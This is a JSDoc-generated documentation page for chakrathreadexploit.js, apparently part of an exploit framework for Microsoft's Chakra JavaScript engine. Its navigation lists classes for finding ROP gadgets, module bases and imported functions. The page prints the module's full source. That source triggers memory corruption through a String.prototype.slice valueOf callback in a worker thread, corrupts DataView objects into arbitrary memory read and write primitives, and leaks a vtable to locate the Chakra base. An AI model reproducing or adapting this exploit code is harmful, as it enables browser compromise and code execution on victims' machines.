<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>chakrathreadexploit.js - Documentation</title>

    <script src="scripts/prettify/prettify.js"></script>
    <script src="scripts/prettify/lang-css.js"></script>
    <!--[if lt IE 9]>
      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <link type="text/css" rel="stylesheet" href="styles/prettify.css">
    <link type="text/css" rel="stylesheet" href="styles/jsdoc.css">
</head>
<body>

<input type="checkbox" id="nav-trigger" class="nav-trigger" />
<label for="nav-trigger" class="navicon-button x">
  <div class="navicon"></div>
</label>

<label for="nav-trigger" class="overlay"></label>

<nav>
    <h2><a href="index.html">Home</a></h2><h3>Classes</h3><ul><li><a href="BaseExploit.html">BaseExploit</a><ul class='methods'><li data-type='method'><a href="BaseExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="BaseExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="BaseExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="BaseExploit.html#importFunction">importFunction</a></li></ul></li><li><a href="BaseExploit_ArrayType.html">BaseExploit#ArrayType</a></li><li><a href="BaseExploit_CString.html">BaseExploit#CString</a></li><li><a href="BaseExploit_FunctionType.html">BaseExploit#FunctionType</a><ul class='methods'><li data-type='method'><a href="BaseExploit_FunctionType.html#cast">cast</a></li></ul></li><li><a href="BaseExploit_IntType.html">BaseExploit#IntType</a></li><li><a href="BaseExploit_Pointer.html">BaseExploit#Pointer</a><ul class='methods'><li data-type='method'><a href="BaseExploit_Pointer.html#add">add</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#isNull">isNull</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#load">load</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#store">store</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#toString">toString</a></li></ul></li><li><a href="BaseExploit_PointerType.html">BaseExploit#PointerType</a><ul class='methods'><li data-type='method'><a href="BaseExploit_PointerType.html#cast">cast</a></li></ul></li><li><a href="BaseExploit_StructPointer.html">BaseExploit#StructPointer</a></li><li><a href="BaseExploit_StructType.html">BaseExploit#StructType</a></li><li><a href="BaseExploit_Type.html">BaseExploit#Type</a></li><li><a href="BaseExploit_WString.html">BaseExploit#WString</a></li><li><a href="ChakraExploit.html">ChakraExploit</a><ul class='methods'><li data-type='method'><a href="ChakraExploit.html#addressOf">addressOf</a></li><li data-type='method'><a href="ChakraExploit.html#addressOfSlow">addressOfSlow</a></li><li data-type='method'><a href="ChakraExploit.html#addressOfString">addressOfString</a></li><li data-type='method'><a href="ChakraExploit.html#call">call</a></li><li data-type='method'><a href="ChakraExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="ChakraExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="ChakraExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="ChakraExploit.html#importFunction">importFunction</a></li><li data-type='method'><a href="ChakraExploit.html#initChakra">initChakra</a></li></ul></li><li><a href="ChakraExploit_ArrayType.html">ChakraExploit#ArrayType</a></li><li><a href="ChakraExploit_CString.html">ChakraExploit#CString</a></li><li><a href="ChakraExploit_FunctionType.html">ChakraExploit#FunctionType</a></li><li><a href="ChakraExploit_IntType.html">ChakraExploit#IntType</a></li><li><a href="ChakraExploit_Pointer.html">ChakraExploit#Pointer</a></li><li><a href="ChakraExploit_PointerType.html">ChakraExploit#PointerType</a></li><li><a href="ChakraExploit_StructPointer.html">ChakraExploit#StructPointer</a></li><li><a href="ChakraExploit_StructType.html">ChakraExploit#StructType</a></li><li><a href="ChakraExploit_Thread.html">ChakraExploit#Thread</a><ul class='methods'><li data-type='method'><a href="ChakraExploit_Thread.html#onmessage">onmessage</a></li><li data-type='method'><a href="ChakraExploit_Thread.html#postMessage">postMessage</a></li></ul></li><li><a href="ChakraExploit_Type.html">ChakraExploit#Type</a></li><li><a href="ChakraExploit_WString.html">ChakraExploit#WString</a></li><li><a href="ChakraThreadExploit.html">ChakraThreadExploit</a><ul class='methods'><li data-type='method'><a href="ChakraThreadExploit.html#addressOf">addressOf</a></li><li data-type='method'><a href="ChakraThreadExploit.html#addressOfSlow">addressOfSlow</a></li><li data-type='method'><a href="ChakraThreadExploit.html#addressOfString">addressOfString</a></li><li data-type='method'><a href="ChakraThreadExploit.html#call">call</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="ChakraThreadExploit.html#importFunction">importFunction</a></li><li data-type='method'><a href="ChakraThreadExploit.html#initChakra">initChakra</a></li><li data-type='method'><a href="ChakraThreadExploit.html#read">read</a></li><li data-type='method'><a href="ChakraThreadExploit.html#write">write</a></li></ul></li><li><a href="ChakraThreadExploit_ArrayType.html">ChakraThreadExploit#ArrayType</a></li><li><a href="ChakraThreadExploit_CString.html">ChakraThreadExploit#CString</a></li><li><a href="ChakraThreadExploit_FunctionType.html">ChakraThreadExploit#FunctionType</a></li><li><a href="ChakraThreadExploit_IntType.html">ChakraThreadExploit#IntType</a></li><li><a href="ChakraThreadExploit_Pointer.html">ChakraThreadExploit#Pointer</a></li><li><a href="ChakraThreadExploit_PointerType.html">ChakraThreadExploit#PointerType</a></li><li><a href="ChakraThreadExploit_StructPointer.html">ChakraThreadExploit#StructPointer</a></li><li><a href="ChakraThreadExploit_StructType.html">ChakraThreadExploit#StructType</a></li><li><a href="ChakraThreadExploit_Thread.html">ChakraThreadExploit#Thread</a></li><li><a href="ChakraThreadExploit_Type.html">ChakraThreadExploit#Type</a></li><li><a href="ChakraThreadExploit_WString.html">ChakraThreadExploit#WString</a></li><li><a href="global.html#Integer">Integer</a><ul class='methods'><li data-type='method'><a href="global.html#Integer#add">add</a></li><li data-type='method'><a href="global.html#Integer#and">and</a></li><li data-type='method'><a href="global.html#Integer#comp">comp</a></li><li data-type='method'><a href="global.html#Integer#compare">compare</a></li><li data-type='method'><a href="global.html#Integer#div">div</a></li><li data-type='method'><a href="global.html#Integer#divide">divide</a></li><li data-type='method'><a href="global.html#Integer#eq">eq</a></li><li data-type='method'><a href="global.html#Integer#equals">equals</a></li><li data-type='method'><a href="global.html#Integer#getHighBits">getHighBits</a></li><li data-type='method'><a href="global.html#Integer#getHighBitsUnsigned">getHighBitsUnsigned</a></li><li data-type='method'><a href="global.html#Integer#getLowBits">getLowBits</a></li><li data-type='method'><a href="global.html#Integer#getLowBitsUnsigned">getLowBitsUnsigned</a></li><li data-type='method'><a href="global.html#Integer#getNumBitsAbs">getNumBitsAbs</a></li><li data-type='method'><a href="global.html#Integer#greaterThan">greaterThan</a></li><li data-type='method'><a href="global.html#Integer#greaterThanOrEqual">greaterThanOrEqual</a></li><li data-type='method'><a href="global.html#Integer#gt">gt</a></li><li data-type='method'><a href="global.html#Integer#gte">gte</a></li><li data-type='method'><a href="global.html#Integer#isEven">isEven</a></li><li data-type='method'><a href="global.html#Integer#isNegative">isNegative</a></li><li data-type='method'><a href="global.html#Integer#isOdd">isOdd</a></li><li data-type='method'><a href="global.html#Integer#isPositive">isPositive</a></li><li data-type='method'><a href="global.html#Integer#isZero">isZero</a></li><li data-type='method'><a href="global.html#Integer#lessThan">lessThan</a></li><li data-type='method'><a href="global.html#Integer#lessThanOrEqual">lessThanOrEqual</a></li><li data-type='method'><a href="global.html#Integer#lt">lt</a></li><li data-type='method'><a href="global.html#Integer#lte">lte</a></li><li data-type='method'><a href="global.html#Integer#mod">mod</a></li><li data-type='method'><a href="global.html#Integer#modulo">modulo</a></li><li data-type='method'><a href="global.html#Integer#mul">mul</a></li><li data-type='method'><a href="global.html#Integer#multiply">multiply</a></li><li data-type='method'><a href="global.html#Integer#neg">neg</a></li><li data-type='method'><a href="global.html#Integer#negate">negate</a></li><li data-type='method'><a href="global.html#Integer#neq">neq</a></li><li data-type='method'><a href="global.html#Integer#not">not</a></li><li data-type='method'><a href="global.html#Integer#notEquals">notEquals</a></li><li data-type='method'><a href="global.html#Integer#or">or</a></li><li data-type='method'><a href="global.html#Integer#shiftLeft">shiftLeft</a></li><li data-type='method'><a href="global.html#Integer#shiftRight">shiftRight</a></li><li data-type='method'><a href="global.html#Integer#shiftRightUnsigned">shiftRightUnsigned</a></li><li data-type='method'><a href="global.html#Integer#shl">shl</a></li><li data-type='method'><a href="global.html#Integer#shr">shr</a></li><li data-type='method'><a href="global.html#Integer#shru">shru</a></li><li data-type='method'><a href="global.html#Integer#sub">sub</a></li><li data-type='method'><a href="global.html#Integer#subtract">subtract</a></li><li data-type='method'><a href="global.html#Integer#toBytes">toBytes</a></li><li data-type='method'><a href="global.html#Integer#toBytesBE">toBytesBE</a></li><li data-type='method'><a href="global.html#Integer#toBytesLE">toBytesLE</a></li><li data-type='method'><a href="global.html#Integer#toInt">toInt</a></li><li data-type='method'><a href="global.html#Integer#toNumber">toNumber</a></li><li data-type='method'><a href="global.html#Integer#toSigned">toSigned</a></li><li data-type='method'><a href="global.html#Integer#toString">toString</a></li><li data-type='method'><a href="global.html#Integer#toUnsigned">toUnsigned</a></li><li data-type='method'><a href="global.html#Integer#xor">xor</a></li></ul></li></ul><h3><a href="global.html">Global</a></h3>
</nav>

<div id="main">
    
    <h1 class="page-title">chakrathreadexploit.js</h1>
    

    



    
    <section>
        <article>
            <pre class="prettyprint source linenums"><code>import ChakraExploit from "chakraexploit";
import Integer from "integer";

/**
 * Constructs an exploit class for a worker script. Used in concert with {@link ChakraExploit#Thread} to support multithreading.
 *
 * @augments ChakraExploit
 * @class
 * @constructor
 */
function ChakraThreadExploit() {
    ChakraExploit.call(this);

    var dvManager = new DataView(new ArrayBuffer(0x1000));
    var dvWorker = new DataView(new ArrayBuffer(0x1000));
    this.dvWorker = dvWorker;
    this.dvManager = dvManager;

    eval('String.prototype.slice').call('', {
        valueOf: function () {
            postMessage('CHAKRA_EXPLOIT');
            while (dvManager.getInt32(0) == 0) {};
        }
    }, 0, 0, 0, 0, 0x41424344, dvWorker, dvManager, 0x41414141);
    
    var vtable = new Integer(dvManager.getInt32(0, true), dvManager.getInt32(4, true));
    this.vtable = vtable;
    this.chakraBase = this.findModuleBase(vtable);
    this.initChakra(vtable);
}
ChakraThreadExploit.prototype = Object.create(ChakraExploit.prototype);
ChakraThreadExploit.prototype.constructor = ChakraThreadExploit;
/**
 * Arbitrary memory read using corrupted DataView.
 *
 * @param {Integer} address Memory address
 * @param {integer} size Bit size
 * @returns {Integer}
 */
ChakraThreadExploit.prototype.read = function (address, size) {
    this.dvManager.setInt32(7 * 8, address.low, true);
    this.dvManager.setInt32(7 * 8 + 4, address.high, true);

    switch (size) {
        case 8: return new Integer(this.dvWorker.getInt8(0, true), 0, true);
        case 16: return new Integer(this.dvWorker.getInt16(0, true), 0, true);
        case 32: return new Integer(this.dvWorker.getInt32(0, true), 0, true);
        case 64: return new Integer(this.dvWorker.getInt32(0, true), this.dvWorker.getInt32(4, true), true);
    }
}
/**
 * Arbitrary memory write using corrupted DataView.
 *
 * @param {Integer} address Memory address
 * @param {Integer} value Value to write
 * @param {integer} size Bit size
 */
ChakraThreadExploit.prototype.write = function (address, value, size) {
    this.dvManager.setInt32(7 * 8, address.low, true);
    this.dvManager.setInt32(7 * 8 + 4, address.high, true);

    switch (size) {
        case 8: return this.dvWorker.setInt8(0, value.low|0, true);
        case 16: return this.dvWorker.setInt16(0, value.low|0, true);
        case 32: return this.dvWorker.setInt32(0, value.low|0, true);
        case 64:
            this.dvWorker.setInt32(0, value.low|0, true);
            this.dvWorker.setInt32(4, value.high|0, true);
    }
}

export default ChakraThreadExploit;
</code></pre>
        </article>
    </section>




</div>

<br class="clear">

<footer>
    Documentation generated by <a href="https://github.com/jsdoc3/jsdoc">JSDoc 3.5.5</a> on Sun Nov 12 2017 13:46:00 GMT+0900 (KST) using the <a href="https://github.com/clenemt/docdash">docdash</a> theme.
</footer>

<script>prettyPrint();</script>
<script src="scripts/linenumber.js"></script>
</body>
</html>
